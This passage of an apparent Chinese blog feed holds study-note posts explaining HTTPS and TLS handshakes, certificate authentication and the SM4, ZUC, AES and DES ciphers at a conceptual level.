HTTP。</p><p>Http+加密+认证+完整性保护=https</p><p>Https的通信端口由SSL/TSL代替了，它是一种应用层协议。一般的情况下http直接和Tcp进行通信，当使用了SSL之后，就会变成先和SSL通信，SSL再和TCP进行通信。</p><h3 id="三、HTTPS采用的加密技术"><a href="#三、HTTPS采用的加密技术" class="headerlink" title="三、HTTPS采用的加密技术"></a>三、HTTPS采用的加密技术</h3><h4 id="（一）对称密钥加密"><a href="#（一）对称密钥加密" class="headerlink" title="（一）对称密钥加密"></a>（一）对称密钥加密</h4><p> SSL采用的加密技术叫做“单密钥加密”，也叫作“对称密钥加密”，这种加密方法是这样的，比如客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密的。这种方式看起来安全，但是仍有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息，这种方式存在安全隐患。</p><h4 id="（二）非对称密钥加密"><a href="#（二）非对称密钥加密" class="headerlink" title="（二）非对称密钥加密"></a>（二）非对称密钥加密</h4><p>“非对称加密”使用的时候有两把锁，一把叫做“私钥”，一把是“公钥”，使用非对称加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密，这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密。</p><h3 id="四、HTTPS通信加密机制"><a href="#四、HTTPS通信加密机制" class="headerlink" title="四、HTTPS通信加密机制"></a>四、HTTPS通信加密机制</h3><h4 id="（一）HTTPS采用混合机制的加密方式"><a href="#（一）HTTPS采用混合机制的加密方式" class="headerlink" title="（一）HTTPS采用混合机制的加密方式"></a>（一）HTTPS采用混合机制的加密方式</h4><p>https则综合了对称密钥加密和非对称密钥加密的两种方式，充分利用两者的优势，在最初的连接的时候使用非对称密钥的加密方式保证连接的安全性，之后稳定的通讯采用对称加密的方式，稳定的通讯是指确保交换的密钥是安全的。</p><p>某网站拥有用于非对称加密的公钥A、私钥A’，浏览器像网站服务器请求，服务器把公钥A明文给传输浏览器，浏览器随机生成一个用于对称加密的密钥X，用公钥A加密后传给服务器，服务器拿到后用私钥A’解密得到密钥X，这样双方就都拥有密钥X了，且别人无法知道它。之后双方所有数据都用密钥X加密解密。</p><p>虽然这种加密方式比对称加密和非对称加密安全，但是还是存在漏洞，某网站拥有用于非对称加密的公钥A、私钥A’，浏览器向网站服务器请求，服务器把公钥A明文给传输浏览器，中间人劫持到公钥A，保存下来，把数据包中的公钥A替换成自己伪造的公钥B（它当然也拥有公钥B对应的私钥B’），浏览器随机生成一个用于对称加密的密钥X，用公钥B（浏览器不知道公钥被替换了）加密后传给服务器，中间人劫持后用私钥B’解密得到密钥X，再用公钥A加密后传给服务器，服务器拿到后用私钥A’解密得到密钥X</p><p>为了应对这种漏洞，HTTPS加入了一种新的安全机制，证书认证</p><h4 id="（二）https的证书机制"><a href="#（二）https的证书机制" class="headerlink" title="（二）https的证书机制"></a>（二）https的证书机制</h4><p>1、服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起</p><p>2、服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。</p><h3 id="五、SSL-TLS"><a href="#五、SSL-TLS" class="headerlink" title="五、SSL/TLS"></a>五、SSL/TLS</h3><p>SSL(Secure Sockets Layer <a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%B1%82" target="_blank" rel="noopener">安全套接层</a>),及其继任者<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">传输层安全</a>（Transport Layer Security，TLS）是为<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/9636548" target="_blank" rel="noopener">网络通信</a>提供安全及<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7/110071" target="_blank" rel="noopener">数据完整性</a>的一种安全协议。TLS与SSL在<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%B1%82/4329536" target="_blank" rel="noopener">传输层</a>对网络连接进行加密。</p><p>SSL是基于HTTP之下TCP之上的一个协议层，是基于HTTP标准并对TCP传输数据时进行加密，所以HPPTS是HTTP+SSL/TCP的简称。</p><p>标准化后的SSL更名为TLS(Transport Layer Security 安全传输层协议)</p><h4 id="（一）SSL协议"><a href="#（一）SSL协议" class="headerlink" title="（一）SSL协议"></a>（一）SSL协议</h4><p>SSL协议是一个分层的协议，共有两层组成。处于SSL协议的底层的是SSL记录层协议(SSL Record Protocol)，它位于可靠的传输层协议(如TCP)之上，用于封装高层协议的数据。其中SSL握手协议(SSL Handshake Protocol)允许服务方和客户方互相认证，并在应用层协议传送数据之前协商出一个加密算法和会话密钥。</p><p>SSL协议实现的安全机制包括：</p><p>数据传输的机密性：利用对称密钥算法对传输的数据进行加密。</p><p>身份验证机制：基于证书利用数字签名方法对服务器和客户端进行身份验证，其中客户端的身份验证是可选的。</p><p>消息完整性验证：消息传输过程中使用MAC算法来检验消息的完整性。</p><h4 id="（二）加密算法"><a href="#（二）加密算法" class="headerlink" title="（二）加密算法"></a>（二）加密算法</h4><h5 id="1、散列函数Hash"><a href="#1、散列函数Hash" class="headerlink" title="1、散列函数Hash"></a>1、散列函数Hash</h5><p>常见的有 MD5、SHA1、SHA256，该类函数特点是函数单向不可逆、对输入非常敏感、输出长度固定，针对数据的任何修改都会改变散列函数的结果，用于防止信息篡改并验证数据的完整性。</p><h5 id="2、对称加密"><a href="#2、对称加密" class="headerlink" title="2、对称加密"></a>2、对称加密</h5><p>常见的有AES-CBC、DES、3DES、AES-GCM等，相同的密钥可以用于信息的加密和解密，掌握密钥才能获取信息，能够防止信息窃听。</p><h5 id="3、非对称加密"><a href="#3、非对称加密" class="headerlink" title="3、非对称加密"></a>3、非对称加密</h5><p>即常见的 RSA 算法，还包括 ECC、DH 等算法，算法特点是，密钥成对出现，一般称为公钥(公开)和私钥(保密)，公钥加密的信息只能私钥解开，私钥加密的信息只能公钥解开。</p><h3 id="六、SSL-TSL握手过程"><a href="#六、SSL-TSL握手过程" class="headerlink" title="六、SSL/TSL握手过程"></a>六、SSL/TSL握手过程</h3><p>（一）客户端发起请求，以明文传输请求信息，包含版本信息，加密套件候选列表，压缩算法候选列表，随机数，扩展字段等信息</p><p>（二）服务端返回协商的信息结果，包括选择使用的协议版本，选择的加密套件 ，选择的压缩算法、随机数等，其中随机数用于后续的密钥协商;服务器端配置对应的证书链，用于身份验证与密钥交换</p><p>（三）证书校验，客户端验证证书的合法性，如果验证通过才会进行后续通信，否则根据错误情况不同做出提示和操作</p><p>（四）合法性验证通过之后，客户端计算产生随机数字 Pre-master，并用证书公钥加密，发送给服务器</p><p>（五）服务器用私钥解密加密的数据，基于之前交换的两个明文随机数，计算得到协商密钥，计算之前所有接收信息的 hash 值，验证数据和密钥正确性;</p><p>（六）握手结束</p><h3 id="七、HTTPS工作流程"><a href="#七、HTTPS工作流程" class="headerlink" title="七、HTTPS工作流程"></a>七、HTTPS工作流程</h3><h4 id="（一）建立连接"><a href="#（一）建立连接" class="headerlink" title="（一）建立连接"></a>（一）建立连接</h4><p>1.服务端首先把自己的公钥（Key1）发给证书颁发机构，向证书颁发机构申请证书。</p><p>2.证书颁发机构自己也有一对公钥私钥。机构利用自己的私钥来加密Key1，并且通过服务端网址等信息生成一个证书签名，证书签名同样经过机构的私钥加密。证书制作完成后，机构把证书发送给了服务端。</p><p>3.当客户端向服务端请求通信的时候，服务端不再直接返回自己的公钥（Key1），而是把自己申请的证书返回给客户端。</p><p>4.客户端收到证书以后，要做的第一件事情是验证证书的真伪。需要说明的是，各大浏览器和操作系统已经维护了所有权威证书机构的名称和公钥。所以客户端只需要知道是哪个机构颁布的证书，就可以从本地找到对应的机构公钥，解密出证书签名，客户端对证书验证成功后，就可以放心地再次利用机构公钥，解密出服务端的公钥Key1。</p><ol start="5"><li><p>客户端生成自己的对称加密密钥Key2，并且用服务端公钥Key1加密Key2，发送给服务端。</p></li><li><p>服务端用自己的私钥解开加密，得到对称加密密钥Key2。于是客户端与服务端开始用Key2进行对称加密的通信。</p></li></ol><h4 id="（二）数据传输"><a href="#（二）数据传输" class="headerlink" title="（二）数据传输"></a>（二）数据传输</h4><ol><li><p>对应用层数据进行分片成合适的 block</p></li><li><p>为分片数据编号，防止重放攻击</p></li><li><p>使用协商的压缩算法压缩数据</p></li><li><p>计算 MAC 值和压缩数据组成传输数据</p></li><li><p>使用 key 加密数据，发送给服务器</p></li><li><p>服务器收到数据之后使用key解密，校验数据，解压缩数据，重新组装</p></li></ol><h3 id="八、HTTP与HTTPS的不同"><a href="#八、HTTP与HTTPS的不同" class="headerlink" title="八、HTTP与HTTPS的不同"></a>八、HTTP与HTTPS的不同</h3><p>(1) HTTPS是加密传输协议，HTTP是明文传输协议</p><p>(2) HTTPS需要用到SSL证书，而HTTP不用</p><p>(3) HTTPS比HTTP更加安全，对搜索引擎更友好，利于SEO</p><p>(4) HTTPS标准端口443，HTTP标准端口80</p><p>(5) HTTPS基于传输层，HTTP基于应用层</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTTP与HTTPS的区别及工作过程  &lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>单钥密码体制三</title>
    <link href="http://soliym.top/2019/12/01/%E5%8D%95%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6%E4%B8%89/"/>
    <id>http://soliym.top/2019/12/01/单钥密码体制三/</id>
    <published>2019-12-01T05:09:52.000Z</published>
    <updated>2019-12-01T05:33:51.432Z</updated>
    
    <content type="html"><![CDATA[<p>下面介绍我国的商用分组密码SM4及单钥密码中的分组密码</p><a id="more"></a><h3 id="一、SM4的特点"><a href="#一、SM4的特点" class="headerlink" title="一、SM4的特点"></a>一、SM4的特点</h3><p>1、</p><p>数据分组长度=128位、密钥长度=128位 </p><p>数据处理单位：字节（ 8位），字（32位） </p><p>2、</p><p>基本轮函数加迭代 </p><p>解密算法与加密算法相同-密钥使用顺序不同</p><h3 id="二、SM4-密码算法基本运算"><a href="#二、SM4-密码算法基本运算" class="headerlink" title="二、SM4 密码算法基本运算"></a>二、SM4 密码算法基本运算</h3><h4 id="1、SM4使用模2加和循环移位运算"><a href="#1、SM4使用模2加和循环移位运算" class="headerlink" title="1、SM4使用模2加和循环移位运算"></a>1、SM4使用模2加和循环移位运算</h4><p>1）模2加：⊕，32 比特异或运算 </p><p>2）循环移位：<em>&lt;&lt;&lt; i</em> <em>，</em>把32位字循环左移<em>i</em> 位</p><h4 id="2、代换运算：S盒"><a href="#2、代换运算：S盒" class="headerlink" title="2、代换运算：S盒"></a>2、代换运算：S盒</h4><p>起混淆作用，输入8bit序列，输出8bit序列</p><p>运算规则根据s盒代换</p><h4 id="3、非线性变换"><a href="#3、非线性变换" class="headerlink" title="3、非线性变换"></a>3、非线性变换</h4><p>由4个并行的S盒构成，输入x1,x2,x3,x4,输出y1,y2,y3,y4</p><p>运算规则根据s盒代换</p><h4 id="4、线性变换"><a href="#4、线性变换" class="headerlink" title="4、线性变换"></a>4、线性变换</h4><p>起扩散作用，输入32bit，输出32bit，循环移位</p><p>L(B)=B^(B&lt;&lt;&lt;2)^(B&lt;&lt;&lt;10)^(B&lt;&lt;&lt;18)^(B&lt;&lt;&lt;24)</p><h4 id="5、合成变换"><a href="#5、合成变换" class="headerlink" title="5、合成变换"></a>5、合成变换</h4><p>由非线性变换和线性变换复合而成</p><h4 id="6、轮函数"><a href="#6、轮函数" class="headerlink" title="6、轮函数"></a>6、轮函数</h4><p>轮函数运算式：F(x0,x1,x2,x3,rk)=x0^T(x1^x2^x3^rk)</p><p>T函数本质上分两步：一是S盒非线性变换，另一个是线性移位。 </p><h3 id="三、加密流程"><a href="#三、加密流程" class="headerlink" title="三、加密流程"></a>三、加密流程</h3><h4 id="加密与解密流程图"><a href="#加密与解密流程图" class="headerlink" title="加密与解密流程图"></a>加密与解密流程图</h4><p><img src="/2019/12/01/单钥密码体制三/01.png" alt="01"></p><h4 id="算法流程图"><a href="#算法流程图" class="headerlink" title="算法流程图"></a>算法流程图</h4><p><img src="/2019/12/01/单钥密码体制三/02.png" alt="02"></p><h3 id="四、加密步骤"><a href="#四、加密步骤" class="headerlink" title="四、加密步骤"></a>四、加密步骤</h3><h4 id="1、明文分组"><a href="#1、明文分组" class="headerlink" title="1、明文分组"></a>1、明文分组</h4><p>SM4算法分组长度为128bit，也就是16个字节，如果SM4算法分组长度为128bit，也就是16个字节，如果明文字节数不是16的整数倍，仍然采取补0凑足128位的方法。</p><p>将明文转换成二进制，然后以128bit分组。</p><h4 id="2、明文组分组"><a href="#2、明文组分组" class="headerlink" title="2、明文组分组"></a>2、明文组分组</h4><p>将128bit的明文组均分为各32bit的子组。</p><h4 id="3、合成变换"><a href="#3、合成变换" class="headerlink" title="3、合成变换"></a>3、合成变换</h4><p><img src="/2019/12/01/单钥密码体制三/03.png" alt="03"></p><p>非线性变换S盒置换规则：</p><p>SM4中利用了4个完全相同的S盒，每个S盒对应8位的输入和8位的输出</p><p>以输入的前半字节为行号，后半字节为列号，行列交叉点处的数据即为输出</p><p>线性变换循环移位加：</p><p>运算规则： </p><p>C=L（B）<em>=B</em>⊕(<em>B</em>&lt;&lt;&lt;2)⊕(<em>B</em>&lt;&lt;&lt;10)⊕(<em>B</em>&lt;&lt;&lt;18) ⊕(<em>B</em>&lt;&lt;&lt;24)</p><p>流程：X1,x2,x3,rk先异或输出32bit数，然后非线性变换，由四个并行的s盒置换，输出32bit数，在经线性变换，输出32bit数</p><h4 id="4、轮函数"><a href="#4、轮函数" class="headerlink" title="4、轮函数"></a>4、轮函数</h4><p>X0&lt;-x1,x1&lt;-x2,x2&lt;-x3,x3-&lt;x0^T(x1^x2^x3^rk)</p><h4 id="5、反序变换"><a href="#5、反序变换" class="headerlink" title="5、反序变换"></a>5、反序变换</h4><p>R（x32,x33,x34,x35）=（x35,x34,x33,x32）</p><h3 id="五、密钥生成"><a href="#五、密钥生成" class="headerlink" title="五、密钥生成"></a>五、密钥生成</h3><p><img src="/2019/12/01/单钥密码体制三/04.png" alt="04"></p><p>1、系统参数FK</p><p>2、固定参数CK</p><p>1、初始密钥MK分为4X32=128bit</p><p>2、MK与FK异或得到K</p><p>3、32轮函数变换得到32个子密钥，轮函数与加密过程基本相同，只是将线性变换修改为</p><p><em>L<strong>(</strong>B<strong>)=</strong>B</em>⊕<em>(<strong>B</strong>&lt;&lt;&lt;</em> <em>13**)</em>⊕<em>(<strong>B</strong>&lt;&lt;&lt;</em> <em>23<strong>)</strong>,<strong>加密函数中用到的是密钥，而密钥扩展算法中用到的是</strong>32bit<strong>固定参数</strong>CK</em></p><h3 id="六、安全性"><a href="#六、安全性" class="headerlink" title="六、安全性"></a>六、安全性</h3><p>①国家专业机构设计。算法简洁，以字和字节为处理单位，对称运算，符合当今分组密码主流。 </p><p>②专业机构进行了密码分析，因此是安全的。 </p><p>③民间学者对21轮SM4进行了差分密码分析。 </p><p>④尚需经过实践检验。</p><h3 id="七、流密码"><a href="#七、流密码" class="headerlink" title="七、流密码"></a>七、流密码</h3><h4 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h4><p>流密码：将明文划分成字符，或其编码的基本单元，字符分别与密钥流作用进行加密，解密时以同步产生的同样的密钥流实现。流密码强度完全依赖于密钥所产生的序列的随机性和不可预测性。</p><p>如果密码序列是一个非周期序列，那么可以做到一次一密体制，一次一密可以实现无条件安全。</p><h4 id="ZUC算法"><a href="#ZUC算法" class="headerlink" title="ZUC算法"></a>ZUC算法</h4><p>ZUC本质上一个密钥序列产生的算法，其输入为128bit的初始密钥和128比特的初始向量，输出为32比特的密钥字序列，其逻辑上分为三层，分别是：16级线性反馈移位寄存器（LFSR），比特重组（BR），非线性函数F。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下面介绍我国的商用分组密码SM4及单钥密码中的分组密码&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>AES列混淆机制详解</title>
    <link href="http://soliym.top/2019/11/25/AES%E5%88%97%E6%B7%B7%E6%B7%86%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/"/>
    <id>http://soliym.top/2019/11/25/AES列混淆机制详解/</id>
    <published>2019-11-25T09:04:37.000Z</published>
    <updated>2019-11-25T10:23:29.069Z</updated>
    
    <content type="html"><![CDATA[<p>在AES中列混淆是比较重要的一步，在列混淆的设计中，设计的算法思想及运算机制是非常值得学习，它包括多项式相乘的处理，以及十六进制乘法中的Xtime机制</p><a id="more"></a><h3 id="一、多项式"><a href="#一、多项式" class="headerlink" title="一、多项式"></a>一、多项式</h3><p>在AES中列混淆是将矩阵的每一列通过运算得到一列新的值，这个运算即使矩阵相乘，将行位移后的矩阵的列，表示为多项式，该多项式有4个项，最高项的次幂为3，多项式系数为矩阵的列值，按列值的行号等于每一项的次幂，得到一个多项式，记为s(x)；</p><p>在固定给出一个多项式，该多项式与s(x)一样，同为最高项的幂为3，该多项式的系数是固定的，这里记为c(x)；</p><p>那么通过两多项式相乘可以得到一个多项式f(x)，但是这个多项式并不是一个最高次幂是3的多项式，因此需要对该多项式取余，即模X^4+1;</p><p>因为x^4+1在F2上约等于(x+1)^4,模一个4次多项式是为了得到一个三次多项式。</p><p>即：X^(i)mod(X^4+1)=X^(imod4)</p><h3 id="二、多项式相乘"><a href="#二、多项式相乘" class="headerlink" title="二、多项式相乘"></a>二、多项式相乘</h3><p>计算两个多项式相乘并不是容易的事，但是可以通过的矩阵的运算，直接求解f(x)的系数</p><p>可以得到：x^3的系数为s3c0+s2c1+s1c2+s0c3，通过验证，多项式的系数可以通过两个矩阵相乘得出，两个矩阵由s(x)和c(x)得出：</p><p>首先根据固定的多项式可以得到一个4X4的矩阵，第3行排列c3 、c2、c1、c0，然后第2行为c2、c1、c0、c3，每一次根据i+1行的循环左移一位，因此，第0行为c0、c3、c2、c1</p><p>s(x)可以得到一个4X1的矩阵，即s0、s1、s2、s3，然后两个矩阵相乘可以得到一个4X1的新列，AES列混淆，就是用这个新列去代换旧列</p><h3 id="三、Xtime-机制"><a href="#三、Xtime-机制" class="headerlink" title="三、Xtime()机制"></a>三、Xtime()机制</h3><p>因为明文矩阵和固定多项式的系数是8bit，即用十六进制表示，因此会遇到十六进制相乘，Xtime()就是简化这个过程</p><p><img src="/2019/11/25/AES列混淆机制详解/01.png" alt="01"></p><p>由上述可以总结：对于02或是03这样的乘法，那我们就可以通过Xtime()机制优化算法</p><p>Xtime()：</p><p>将括号内的数左移一位，判断是否有溢出</p><p>1、无溢出，直接输出</p><p>2、有溢出，异或1B后输出</p><p>判断最高位是否溢出：如果最高位为0，则一位后不输出，如果为1，则移位后溢出</p><h3 id="四、列混淆的完整表达式"><a href="#四、列混淆的完整表达式" class="headerlink" title="四、列混淆的完整表达式"></a>四、列混淆的完整表达式</h3><p><img src="/2019/11/25/AES列混淆机制详解/02.png" alt="02"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在AES中列混淆是比较重要的一步，在列混淆的设计中，设计的算法思想及运算机制是非常值得学习，它包括多项式相乘的处理，以及十六进制乘法中的Xtime机制&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>单钥密码体制二</title>
    <link href="http://soliym.top/2019/11/24/%E5%8D%95%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6%E4%BA%8C/"/>
    <id>http://soliym.top/2019/11/24/单钥密码体制二/</id>
    <published>2019-11-24T11:54:21.000Z</published>
    <updated>2019-11-25T08:55:29.210Z</updated>
    
    <content type="html"><![CDATA[<p>数据加密标准-DES是第一个并且也是十分重要的现代对称加密算法，但是由于DES密钥太短，伴随着计算机的计算能力的突飞猛进，DES已经极其不安全，所以需要新的加密算法代替DES，由2000年公布的AES高级加密标准代替DES。</p><a id="more"></a><h3 id="一、AES"><a href="#一、AES" class="headerlink" title="一、AES"></a>一、AES</h3><p>RIJIdael是分组长度和密钥长度均可变的分组密码，密钥长度和分组长度可以独立指定为128b、192b、256b，由比利时密码学家Daemen和Rijmen设计。</p><p>二、加密流程图</p><p><img src="/2019/11/24/单钥密码体制二/01.png" alt="01"></p><h3 id="三、加密步骤"><a href="#三、加密步骤" class="headerlink" title="三、加密步骤"></a>三、加密步骤</h3><h4 id="1、明文分组"><a href="#1、明文分组" class="headerlink" title="1、明文分组"></a>1、明文分组</h4><p>AES是分组密码，将明文分成固定长度大小的组，每组分别加密，以128为例，将128bit的明文以字节为单位分为16组，在按序每4字节为一列，组成4X4矩阵。</p><h4 id="2、字节代换"><a href="#2、字节代换" class="headerlink" title="2、字节代换"></a>2、字节代换</h4><p>在4X4矩阵中，每个元素都是1字节，8bit，因此，每个元素的前4bit组成行，后4bit组成列，通过s盒查找，代换为新的元素</p><h4 id="3、行位移"><a href="#3、行位移" class="headerlink" title="3、行位移"></a>3、行位移</h4><p>将4X4矩阵每行循环左移i个元素，i为正整数，从0开始。</p><h4 id="4、列混淆"><a href="#4、列混淆" class="headerlink" title="4、列混淆"></a>4、列混淆</h4><p>将矩阵的每个列视为GF（2^8）上的多项式，再与一个固定的多项式c(x)进行模x^4+1乘法，要求c（x）是模x^4+1可逆的多项式</p><p><img src="/2019/11/24/单钥密码体制二/02.png" alt="02"></p><p>列混淆的实质是两个多项式的相乘，并且希望得到一个多项式，但是两个多项式相乘的结果最高次项不是3，在列混淆中时两个最高次幂为3的多项式相乘，因此，需要模x^4+1.其中</p><p>因为多项式的乘法可由线性代数，即矩阵乘法给出，所以采用矩阵运算。</p><h4 id="5、轮密钥加"><a href="#5、轮密钥加" class="headerlink" title="5、轮密钥加"></a>5、轮密钥加</h4><p>将4X4的明文矩阵和4X4的密钥矩阵按位异或，既128bit与128bit异或</p><h3 id="四、密钥生成"><a href="#四、密钥生成" class="headerlink" title="四、密钥生成"></a>四、密钥生成</h3><p>初始给定的密钥是128bit，用于初始加密，但是在后面的10轮迭代中都需要用到密钥，它们加密的密钥是不同的，需要通过初始的128bit密钥，扩展出10个128bit的密钥。因此，AES加密需要11X128bit的密钥。</p><p>密钥是按矩阵的列进行分组的，需要添加40个新列来扩展密钥。</p><p><img src="/2019/11/24/单钥密码体制二/03.png" alt="03"></p><p>当i可以被4整除，需要用到T函数</p><p>T函数：1、RCON轮常量，轮常量是一个字32bit，这个字最右边为3个字节24bit的0。</p><p>​                    轮常量是固定的，每一轮均不相同。</p><p>​              2、ROTBYTE字节代换，利用S盒对输入的数替换，前4bit为行，后4bit为列</p><p>​              3、BYTESUB字循环，循环左移一个字节，即abcd变为bcda</p><h3 id="五、解密过程"><a href="#五、解密过程" class="headerlink" title="五、解密过程"></a>五、解密过程</h3><p>AES与DES不同，AES的解密过程与加密过程是不同的，不同是指解密的过程是相反的，而Feistel密码的加密解密可以使用相同的电路或程序，因为AES所有中间的加密过程都是可逆的，所以解密过程与加密过程相反，具体操作位加密操作的逆过程。</p><p>例：</p><p><img src="/2019/11/24/单钥密码体制二/04.png" alt="04"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据加密标准-DES是第一个并且也是十分重要的现代对称加密算法，但是由于DES密钥太短，伴随着计算机的计算能力的突飞猛进，DES已经极其不安全，所以需要新的加密算法代替DES，由2000年公布的AES高级加密标准代替DES。&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>单钥密码体制(一)</title>
    <link href="http://soliym.top/2019/11/24/%E5%8D%95%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6%E4%B8%80/"/>
    <id>http://soliym.top/2019/11/24/单钥密码体制一/</id>
    <published>2019-11-24T09:34:01.756Z</published>
    <updated>2019-11-24T09:57:33.605Z</updated>
    
    <content type="html"><![CDATA[<p>信息安全的两次变革：第一次是计算机的诞生，许多重要文件存储于计算机中，因此，计算机的主机安全就成为了一个重要的问题。第二次是计算机网络及分布式系统的诞生，人们利用网络对数据传输，在这个复杂且庞大的网络中，如何去传输重要数据，这又给信息安全带来新的问题和挑战。随着这些问题的解决，密码学也在不断的发展中。信息安全的四个目标：保密性、完整性、可用性、合法使用。</p><a id="more"></a><h3 id="一、单钥密码体制"><a href="#一、单钥密码体制" class="headerlink" title="一、单钥密码体制"></a>一、单钥密码体制</h3><p>单钥密码体制也称为私钥加密体制，因为通信双方采用的密码相同，因此，也称为对称加密体制，根据其加密算法的特点，可分为：分组密码和流密码。</p><p>古典密码：是一种简单的加密体制，它伴随着密码学的发展，它的思想对单钥密码体制影响深远，代换和置换思想，是单钥密码体制的基础。</p><p>密码学可分为古代密码、近代密码、现代密码，它有两个重要的时期，一是1949，密码学成为一门学科，二是1976年，公钥密码算法的出现。</p><p>密码学的进程：从单表代替到多表代替，再到机械码，以及现在的现代密码学，未来将会出现的量子密码学。</p><p>密码学中有一个重要的定律：伯格夫斯基定律：每一个密码都是可以破解的</p><p>虽然有些密码至今没有人可以破解，但是根据密码学的加密规则来说，密文都是根据一定的规则由明文加密而来，因此，密文肯定是可以破解的，只是时间和方法问题。</p><p>既然所有的密码都是可以破解的，那么机密算法的安全性在哪？</p><p>1、破译的成本超过加密信息性价值</p><p>2、破译的时间超过加密信息的生命周期</p><h3 id="二、分组密码DES"><a href="#二、分组密码DES" class="headerlink" title="二、分组密码DES"></a>二、分组密码DES</h3><h4 id="1、DES"><a href="#1、DES" class="headerlink" title="1、DES"></a>1、DES</h4><p>DES是一种分组加密算法，输入的明文为64位，密钥为56位，生成的密文分组长度为64位</p><h4 id="2、DES算法"><a href="#2、DES算法" class="headerlink" title="2、DES算法"></a>2、DES算法</h4><p>1、对输入分组进行固定的“初始置换”IP运算，可以将这个置换表示为：</p><p>  <img src="/2019/11/24/单钥密码体制一/01.png" alt="01"></p><p> 注意：这里L0和R0称为“左右半分组”，各为32比特。IP是固定的函数（即输入密钥不是它的参数），它是公开的。这个过程实际上为“扩散（ Diffusion ）”。</p><p>2、迭代运算，即将下面的运算迭代16轮</p><p><img src="/2019/11/24/单钥密码体制一/02.png" alt="02"></p><p>这个过程就是香农信息论中的“混淆”       </p><p>3、将16轮迭代后得到的结果（L16, R16）输入到IP的逆置换IP-1中：</p><p>注意：DES算法的加密和解密运算均采用这3个步骤。仅有的不同是：如果加密算法中使用的轮密钥次序为k1, k2, …, k16，那么解密算法中使用的密钥次序为：k16, k15, …, k1。   </p><p><img src="/2019/11/24/单钥密码体制一/03.png" alt="03"></p><p>加密流程：</p><p><img src="/2019/11/24/单钥密码体制一/04.png" alt="04"></p><p>3、密钥生成</p><p><img src="/2019/11/24/单钥密码体制一/05.png" alt="05"></p><p>4、迭代结构</p><p><img src="/2019/11/24/单钥密码体制一/06.png" alt="06"></p><p>DES的轮结构重点在于F函数，F函数将32bit明文扩展为48bit密文，然后在于密钥异或，再通过S盒的替换，压缩成32bit。</p><p>F函数中明文的扩展：将明文分为8*4的矩阵，在矩阵的左右两侧，各加入一列元素，元素生成规则为：元素空间为0到32，左侧一列为第一列元素-1，如果为-1，则为32，右侧一列+1模32</p><p>F函数中的密文压缩：通过8个s盒的代换，代换规则，将48bit密文分为8组，每组6bit，分别对应8个S盒，然后将每组的第一位和最后一位组成行，其他位组成列，然后查表替换。</p><h3 id="三、DES安全性"><a href="#三、DES安全性" class="headerlink" title="三、DES安全性"></a>三、DES安全性</h3><p>因为DES的密钥太短，因此不能抵抗穷举密钥搜索攻击，已被破解，但是它的思想影响了后来单钥密码体制的设计。</p><h3 id="四、DES的设计思想"><a href="#四、DES的设计思想" class="headerlink" title="四、DES的设计思想"></a>四、DES的设计思想</h3><p>DES的设计主要包含了扩散和混淆，这也是单钥加密算法中，分组密码的基本设计思想，扩散是将密钥对明文的影响尽可能多的去影响明文中的元素，使明文和密文的差别尽可能的大。混淆是将明文和密文的联系尽可能小，通过统计等手段，不能确定明文和密文之间的关系。</p><p>扩散和混淆的思想来源于古典密码中的置换和代换。</p>]]></content>
    
    <summary type="html">
    
